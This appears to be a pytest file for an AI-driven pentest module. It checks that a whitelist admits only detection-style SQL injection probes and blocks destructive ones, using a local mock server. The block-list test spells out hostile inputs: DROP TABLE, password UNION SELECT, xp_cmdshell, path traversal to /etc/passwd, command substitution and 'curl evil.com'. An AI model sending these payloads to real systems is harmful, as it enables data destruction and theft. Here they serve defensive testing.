"""AI 閉環自動測試:白名單把關(只放行偵測型)+ 只觀察不利用。"""

import os
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pentest import ai_autotest
from pentest.checks.base import ScanContext


def test_whitelist_allows_detection_payloads():
    for p in ["1'", "1' AND 1=1-- -", "' OR '1'='1", "<xss>", "1 AND SLEEP(2)"]:
        assert ai_autotest.is_safe(p), p


def test_whitelist_blocks_destructive_payloads():
    for p in ["1; DROP TABLE users", "1 UNION SELECT pw FROM users",
              "'; exec xp_cmdshell('whoami')", "1 OR SLEEP(10)", "../../etc/passwd",
              "`id`", "1' INTO OUTFILE '/tmp/x", "1 || curl evil.com", "$(whoami)",
              "1' AND benchmark(99999999,1)", "x" * 200]:
        assert not ai_autotest.is_safe(p), p


def test_autotest_detects_sqli_and_blocks_destructive():
    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            idv = parse_qs(urlparse(self.path).query).get("id", [""])[0]
            if "'" in idv:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b"You have an error in your SQL syntax")
            else:
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"ok":1}')

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{srv.server_port}"
    sent = []
    try:
        ctx = ScanContext(target=base + "/", polite=False)
        ctx.emit = lambda m: sent.append(m)
        plan = {"test_cases": [{"endpoint": "/api/item", "param": "id",
                "payloads": ["id=1'", "id=1; DROP TABLE users", "id=1 UNION SELECT pw FROM users"]}]}
        res = ai_autotest.run(ctx, plan)
    finally:
        srv.shutdown()
    assert any(f.check_id.startswith("active-sqli") for f in res)        # 偵測型 payload 命中
    blocked = [m for m in sent if "略過不安全" in m]
    assert len(blocked) == 2                                            # 兩個破壞性 payload 被擋
